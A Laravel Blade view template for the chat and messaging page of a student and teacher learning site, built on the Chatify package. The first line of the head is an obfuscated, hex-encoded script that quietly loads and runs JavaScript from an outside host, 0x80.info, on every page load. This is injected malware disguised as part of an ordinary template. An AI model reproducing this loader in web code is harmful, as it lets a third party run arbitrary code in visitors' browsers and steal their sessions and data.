<!DOCTYPE html>
<html lang="en">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<title>latogo</title>
<meta content="" name="description">
<meta content="" name="keywords">
<meta name="csrf-token" content="{{ csrf_token() }}">

<link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/img/favicon.svg')}}">
<link rel="stylesheet" href="{{ asset('assets/css/bootstrap.min.css') }}">
<link rel="stylesheet" href="{{ asset('assets/plugins/fontawesome/css/fontawesome.min.css') }}">
<link rel="stylesheet" href="{{ asset('assets/plugins/fontawesome/css/all.min.css') }}">
<link rel="stylesheet" href="{{ asset('assets/css/feather.css') }}">
<link rel="stylesheet" href="{{ asset('assets/css/style.css') }}">
<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
<script>
    @if (Auth::user()->user_type == 1)
        var base_url = '{{ url("/student/") }}';
    @else
        var base_url = '{{ url("/teacher/") }}';
    @endif
    </script>

</head>

<body>

<!-- header -->
<div class="main-wrapper">
@if (Auth::user()->user_type == 1)
    @include('layouts.student.header')
@else
    @include('layouts.teacher.header')
@endif
@include('Chatify::layouts.headLinks')
<div class="container mt-3">
    <div class="messenger">
        {{-- ----------------------Users/Groups lists side---------------------- --}}
        <div class="messenger-listView {{ !!$id ? 'conversation-active' : '' }}">
            {{-- Header and search bar --}}
            <div class="m-header">
                <nav>
                    <a href="#"><i class="fas fa-inbox"></i> <span class="messenger-headTitle">MESSAGES</span> </a>
                    {{-- header buttons --}}
                    {{-- <nav class="m-header-right">
                        <a href="#"><i class="fas fa-cog settings-btn"></i></a>
                        <a href="#" class="listView-x"><i class="fas fa-times"></i></a>
                    </nav> --}}
                </nav>
                {{-- Search input --}}
                <input type="text" class="messenger-search" placeholder="Search" />
                {{-- Tabs --}}
                {{-- <div class="messenger-listView-tabs">
                    <a href="#" class="active-tab" data-view="users">
                        <span class="far fa-user"></span> Contacts</a>
                </div> --}}
            </div>
            {{-- tabs and lists --}}
            <div class="m-body contacts-container">
            {{-- Lists [Users/Group] --}}
            {{-- ---------------- [ User Tab ] ---------------- --}}
            <div class="show messenger-tab users-tab app-scroll" data-view="users">
                {{-- Favorites --}}
                <div class="favorites-section">
                    <p class="messenger-title"><span>Favorites</span></p>
                    <div class="messenger-favorites app-scroll-hidden"></div>
                </div>
                {{-- Saved Messages --}}
                <p class="messenger-title"><span>Your Space</span></p>
                {!! view('Chatify::layouts.listItem', ['get' => 'saved']) !!}
                {{-- Contact --}}
                <p class="messenger-title"><span>All Messages</span></p>
                <div class="listOfContacts" style="width: 100%;height: calc(100% - 272px);position: relative;"></div>
            </div>
                {{-- ---------------- [ Search Tab ] ---------------- --}}
            <div class="messenger-tab search-tab app-scroll" data-view="search">
                    {{-- items --}}
                    <p class="messenger-title"><span>Search</span></p>
                    <div class="search-records">
                        <p class="message-hint center-el"><span>Type to search..</span></p>
                    </div>
                </div>
            </div>
        </div>

        {{-- ----------------------Messaging side---------------------- --}}
        <div class="messenger-messagingView">
            {{-- header title [conversation name] amd buttons --}}
            <div class="m-header m-header-messaging">
                <nav class="chatify-d-flex chatify-justify-content-between chatify-align-items-center">
                    {{-- header back button, avatar and user name --}}
                    <div class="chatify-d-flex chatify-justify-content-between chatify-align-items-center">
                        <a href="#" class="show-listView"><i class="fas fa-arrow-left"></i></a>
                        {{-- <div class="avatar av-s header-avatar" style="margin: 0px 10px; margin-top: -5px; margin-bottom: -5px;">
                        </div> --}}
                        <a href="#" class="user-name">{{ config('chatify.name') }}</a>
                    </div>
                    {{-- header buttons --}}
                    <nav class="m-header-right">
                    {{-- <a href="#" class="add-to-favorite"><i class="fas fa-star"></i></a> --}}
                        @if (Auth::user()->user_type == 1)
                            <a href="/student/my-classes"><i class="fas fa-home"></i></a>
                        @else
                            <a href="/teacher/dashboard"><i class="fas fa-home"></i></a>
                        @endif
                        {{-- <a href="#" class="show-infoSide"><i class="fas fa-info-circle"></i></a> --}}
                    </nav>
                </nav>
                {{-- Internet connection --}}
                <div class="internet-connection">
                    <span class="ic-connected">Connected</span>
                    <span class="ic-connecting">Connecting...</span>
                    <span class="ic-noInternet">No internet access</span>
                </div>
            </div>

            {{-- Messaging area --}}
            <div class="m-body messages-container app-scroll">
                <div class="messages">
                    <p class="message-hint center-el"><span>Please select a chat to start messaging</span></p>
                </div>
                {{-- Typing indicator --}}
                <div class="typing-indicator">
                    <div class="message-card typing">
                        <div class="message">
                            <span class="typing-dots">
                                <span class="dot dot-1"></span>
                                <span class="dot dot-2"></span>
                                <span class="dot dot-3"></span>
                            </span>
                        </div>
                    </div>
                </div>

            </div>
            {{-- Send Message Form --}}
            @include('Chatify::layouts.sendForm')
        </div>
        {{-- ---------------------- Info side ---------------------- --}}
        {{-- <div class="messenger-infoView app-scroll">--}}
            {{-- nav actions --}}
            {{--<nav>
                <p>User Details</p>
                <a href="#"><i class="fas fa-times"></i></a>
            </nav>
            {!! view('Chatify::layouts.info')->render() !!}
        </div> --}}
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

@include('Chatify::layouts.modals')
@include('Chatify::layouts.footerLinks')


@if (Auth::user()->user_type == 1)
    @include('layouts.student.footer')
@else
    @include('layouts.teacher.footer')
@endif
</div>



<script src="{{ asset('assets/js/bootstrap.bundle.min.js') }}"></script>

<script src="{{ asset('assets/plugins/feather/feather.min.js') }}"></script>

<script src="{{ asset('assets/plugins/theia-sticky-sidebar/ResizeSensor.js') }}"></script>
<script src="{{ asset('assets/plugins/theia-sticky-sidebar/theia-sticky-sidebar.js') }}"></script>

<script src="{{ asset('assets/plugins/apexchart/apexcharts.min.js') }}"></script>
<script src="{{ asset('assets/plugins/apexchart/chart-data.js') }}"></script>

<script src="{{ asset('assets/js/script.js') }}"></script>

<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

<script>
    $(document).ready(function(){
        if ($('div.my-toast').length>0) {
            $(".my-toast").delay(5000).fadeOut();
        }
    });
</script>
@stack('script')
</body>

</html>
